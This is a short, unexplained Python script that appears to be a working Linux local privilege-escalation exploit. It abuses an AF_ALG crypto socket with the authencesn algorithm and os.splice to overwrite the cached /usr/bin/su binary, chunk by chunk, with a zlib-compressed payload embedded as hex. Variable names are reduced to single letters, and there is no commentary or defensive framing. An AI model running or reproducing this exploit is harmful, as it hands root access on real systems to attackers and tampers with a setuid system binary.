#!/usr/bin/env python3
import zlib
import socket
import os


def c(f, t, c):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    a.setsockopt(h, 1, bytes.fromhex('0800010000000010' + '0' * 64))
    a.setsockopt(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = bytes.fromhex('00')
    u.sendmsg([b"A" * 4 + c], [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3), ], 32768)
    r, w = os.pipe()
    os.splice(f, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)
    try:
        u.recv(8 + t)
    except:
        0


f = os.open("/usr/bin/su", 0)
i = 0
e = zlib.decompress(bytes.fromhex("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1"
                                  "680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c"
                                  "0c0032c310d3"))
while i < len(e):
    c(f, i, e[i:i + 4])
    i += 4
